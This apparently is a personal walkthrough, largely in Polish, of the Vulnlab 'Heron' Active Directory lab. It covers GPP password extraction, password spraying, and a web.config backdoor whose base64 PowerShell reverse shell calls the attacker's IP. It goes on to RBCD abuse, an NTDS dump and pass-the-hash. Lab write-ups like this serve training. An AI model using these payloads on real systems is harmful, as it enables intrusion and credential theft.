# Heron
Windows, Medium, created by **xct**
```
nmap -Pn -v -p- --version-all -oA nmapFULL --max-rate 1000 10.10.215.53 10.10.215.54
sudo nmap -sU -Pn -A -F -v -oA nmaUDP --max-rate 1000 10.10.215.53 10.10.215.54
```

I was surprised that only ssh open, but then I remembered that these chains have scripts xd

![{62F15BCC-926F-4FA1-881E-16C953BF1EB0}](https://github.com/user-attachments/assets/693e4ad6-47d2-4f73-a01d-31f962d9a174)

![{512B1DA5-B3C1-430F-B8B7-3A0B11FF2D9E}](https://github.com/user-attachments/assets/7b2612ab-58a9-4616-abef-29ce5fdcaf73)

`wget https://github.com/peass-ng/PEASS-ng/releases/download/20241205-c8c0c3e5/linpeas_fat.sh`

przejęcie `_local` to root od ręki

![{223C33F0-43DF-4868-9020-5B43A72970BF}](https://github.com/user-attachments/assets/dea022c4-45a7-44f7-97f4-44116d03e078)

tak losowe screeny wrzucam, które mogą się przydać.

![{73022E23-F40B-4AE6-8A04-F3757A46ACAF}](https://github.com/user-attachments/assets/028d4c18-cb47-4b41-a19e-b485bf97212f)

![{9A69E1AD-AC83-476A-8F35-BB928B9DCAC1}](https://github.com/user-attachments/assets/fc78c30d-f2fb-4799-b791-058039c61c2d)

![{D6F671A8-FDBC-47F9-A912-9E556B21DD09}](https://github.com/user-attachments/assets/89016ebb-ea0a-427d-8304-923a82460a58)

wrzucam socks proxy z ssh i jakiś nmapik

```
proxychains4 -q nmap -Pn -v 10.10.215.0/24 -oA nmapTOP1000
```

dziwna sprawa. PRzez proxychains nie mogę po ludzku skanować `10.10.215.53`.

![{E55C7310-8CC9-4FF0-8B7E-AEAA387539A4}](https://github.com/user-attachments/assets/77ca6258-f5e3-470a-96ab-f43cd72e3c70)

dziiiiiwne

![{E13FE1C2-EC53-4C4D-95C1-F203CE71E658}](https://github.com/user-attachments/assets/f1151f40-2796-4081-ac04-628f58f3296b)

![{3154A60D-742E-4E0C-B5D1-A1EA548A5BA6}](https://github.com/user-attachments/assets/66b14272-0f84-4d4d-9383-13b58347b8a2)

o trafiłem w port 80. To lecimy z nim

![{DC317D39-231D-4AB3-82C4-010D1F7750A4}](https://github.com/user-attachments/assets/b30b4100-d90c-4e12-9823-5fd5c9f0fb24)

![{C0129661-25EA-4717-A8DB-7714C21DAB0F}](https://github.com/user-attachments/assets/88dfa5df-4e51-42c3-9feb-1106432c12d4)

![{B6F9C402-FCBA-45E4-AD16-29AC205E25AB}](https://github.com/user-attachments/assets/d87c4417-69e6-411c-899c-f9c67e938117)

- jeszcze zanim to to od dzisiaj zawsze wpisuję `-M gpp_password` jak mam usera. Ciekawe rzeczy da się wyjąć (kolega polecił)

![{55BDA128-A025-4239-89FD-A7B0D2FC417C}](https://github.com/user-attachments/assets/b6478868-514c-4cfa-85f7-a5c94fda8eff)

- haslo nie pasuje do żadnego usera. Trzeba chyba sprawdzić na wszystkich z ldapa.

```
proxychains4 ldapdomaindump -u 'heron.vl\samuel.davies' -p <pass> 10.10.215.53
```

![{B16D5D6B-DBE8-4298-911E-A2AFBB26346E}](https://github.com/user-attachments/assets/d7eaea3f-659d-4450-922c-e249aa06d8ca)


- ale haslo nie pasuje do żadnego :/

DOBRA SIADŁO
```
proxychains4 -q nxc ldap 10.10.215.53 -u full_users_list -p '<pass from gpp>' --continue-on-success
proxychains4 -q nxc ssh 10.10.215.54 -u full_users_list_and_domain -p '<pass from gpp>' --continue-on-success 
```

siadło do usera `svc-web-accounting-d` na 10.10.215.53 po smb and user `svc-web-accounting-d` with ssh access on 10.10.215.54.
- btw jeżeli dalibyśmy print $1 w awk wyżej to zamiast  `svc-web-accounting-d` mielibyśmy usera  `svc-web-accounting-dev` i wtedy by nie siadło.

![{6A656547-7B63-42C5-8134-8536F6367167}](https://github.com/user-attachments/assets/98da0fbd-a98b-462d-a106-354f56fa038f)

och new share.

![{C9DECD92-BC73-414F-A53D-E5651B460B8B}](https://github.com/user-attachments/assets/b20c8021-1ab1-4b3e-8afa-6657548e1036)

o mmay write tam gdzie jest web.config
- wygląda jak proste nt authority system
- ale też nadpisywanie web.config może dużo rozwalić więc poszukam innych metod

trochę czytania `https://soroush.me/blog/tag/rce/`.

![{F55B628E-B2CD-4D5B-8BF1-1C6357B98BFA}](https://github.com/user-attachments/assets/1a869344-656c-4b85-b154-4c1026d40c81)

po prawie 2h udało mi się... je jebe.
```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="backdoor" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="powershell.exe" arguments='/c IWR http://10.8.4.124/' stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="OutOfProcess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
```
TO DZIAŁA. Czas przerobić to na rev shella

- wróciłem po 5 dniach przerwy i payload wyżej nie działa.. nie wierzę po prostu
- dobra bo ja muszę się odnieść do domenki, a nie samego adresu IP xD

```
  <?xml version="1.0" encoding="utf-8"?>  
<configuration>  
  <location path="." inheritInChildApplications="false">  
    <system.webServer>  
      <handlers>  
        <add name="aspNetCore" path="backdoor" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />  
      </handlers>  
      <aspNetCore processPath="powershell" arguments="-e CgAkAHgAeAB4AHgAIAA9ACAAJwAxADAALgA4AC4ANAAuADEAMgA0ACcACgAkAHAAbwByAHQAIAA9ACAAJwA0ADQAMwAnAAoAJAB0AGMAcAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACQAeAB4AHgAeAAsACQAcABvAHIAdAApAAoAJAB0AGMAcABzAHQAcgAgAD0AIAAkAHQAYwBwAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoAJAByAGUAYQBkAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAdABjAHAAcwB0AHIAKQAKACQAdwByAGkAdABlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHQAYwBwAHMAdAByACkACgAkAHcAcgBpAHQAZQByAC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlAAoAdwBoAGkAbABlACAAKAAkAHQAYwBwAC4AQwBvAG4AbgBlAGMAdABlAGQAKQAKAHsACgAkAHgAPQBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBhAGQAZQByAC4AUgBlAGEAZABMAGkAbgBlACgAKQA7AAoAJAB5AD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAB4AAoAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAJAB5ACkAOwAKAH0ACgAkAHIAZQBhAGQAZQByAC4AQwBsAG8AcwBlACgAKQAKACQAdwByAGkAdABlAHIALgBDAGwAbwBzAGUAKAApAAoAJAB0AGMAcAAuAEMAbABvAHMAZQAoACkACgA=" hostingModel="OutOfProcess" />  
    </system.webServer>  
  </location>  
</configuration>  
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
```
```
proxychains4 -q curl accounting.heron.vl/backdoor/
```

![{76978B61-56A5-459C-8F49-01B760704422}](https://github.com/user-attachments/assets/560f7a84-c02d-4517-b8c4-4ddddef0bbe2)

![{4701358D-27A1-4B07-89F7-2DD860005B79}](https://github.com/user-attachments/assets/a237fa71-d727-42d2-ab20-0e43084d3c2f)

![ssh](https://github.com/user-attachments/assets/efa6a53c-769f-42fe-90f1-4f8f4e08c0bd)

![{7B8C2F49-2AE6-4EE5-ABAE-95B554C077D3}](https://github.com/user-attachments/assets/ad0284db-dd81-470c-b3bc-2b8f57e4007d)

szybki root

![{70B879A3-9BB0-41FE-9071-706D806698A1}](https://github.com/user-attachments/assets/2810fb28-07f4-4222-b2b7-9f303d3c557e)

jeszcze test czy to hasło nie działa gdzieś więcej
```
proxychains4 -q nxc smb 10.10.180.213 -u users -p '<password from ssh.ps1>' --continue-on-success
```

```
SMB         10.10.180.213   445    MUCDC            [+] heron.vl\julian.pratt:'<password from ssh.ps1>

```

new user access.
New it is time to dump something from `/etc/krb5.keytab`
`https://raw.githubusercontent.com/sosdave/KeyTabExtract/refs/heads/master/keytabextract.py`

![hash](https://github.com/user-attachments/assets/93a5f1df-2bf1-4ef8-a7f9-086c30da04d9)

- chyba nic ciekawego na razie. Enumerujemy dalej.

![lnk](https://github.com/user-attachments/assets/eb3deabd-2c53-4b1e-b911-2b881a9bf37b)

kilka lnk się znalazło.

![user](https://github.com/user-attachments/assets/6cf08c4b-3df6-4311-99d4-19d4082e0b9e)

to już mamy.

![new](https://github.com/user-attachments/assets/f2746a99-b53a-44b7-a8a1-063fde0d55da)

a tutaj kolejny user

```
proxychains4 -q bloodhound-python -d 'heron.vl' -u 'adm_prju' -p '<password from .lnk>' -c all -ns 10.10.180.213
```

![{E1DCB96D-7699-464D-BBDA-71D40414C5CF}](https://github.com/user-attachments/assets/ac27072e-af1d-46ea-a157-ad9f9be447cc)

![{A6EABD38-7A1F-42F4-A2EC-C61C1187BBF1}](https://github.com/user-attachments/assets/391b50c0-428c-4143-9847-8dd86d145c90)

no to lecimy

![0 pc](https://github.com/user-attachments/assets/fc253432-f0a3-4c4e-ac0b-dd95828a5e08)

na początek utrudnienie, bo kompa dodać nie możemy.

```
proxychains4 -q impacket-rbcd -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -action 'write' 'heron.vl'/'adm_prju':'<password from .lnk>' -dc-ip 10.10.180.213
proxychains4 -q impacket-getST -spn 'cifs/MUCDC' -impersonate '_admin' 'domain/FRAJMP$' -dc-ip 10.10.180.213 -hashes :6f55b3b443ef192c804b2ae98e8254f7
```

![hashprzydaje](https://github.com/user-attachments/assets/d76974c8-d2cd-494c-8c5b-c46e9e529420)

tutaj nasz hash się przydaje

![{B2516237-7B7B-4536-AC3D-00E8AECB38D7}](https://github.com/user-attachments/assets/87eb9db6-ad56-4052-91b1-dbf72d04f093)

- coś nie śmiga :/

I changed domain
```
proxychains4 -q impacket-getST -spn 'cifs/MUCDC.heron.vl' -impersonate '_admin' 'heron.vl/FRAJMP$' -dc-ip 10.10.180.213 -hashes :6f55b3b443ef192c804b2ae98e8254f7
export KRB5CCNAME=_admin@cifs_MUCDC.heron.vl@HERON.VL.ccache
proxychains4 -q nxc smb 10.10.180.213 --use-kcache --ntds
```

![final](https://github.com/user-attachments/assets/89132067-12c2-4145-9193-1708b2f5c3a1)

```
proxychains4 -q impacket-wmiexec _admin:''@10.10.180.213 -hashes :<hash> 
```

![flaga](https://github.com/user-attachments/assets/19a2beb6-f849-41dc-832e-d0420fe7c47e)
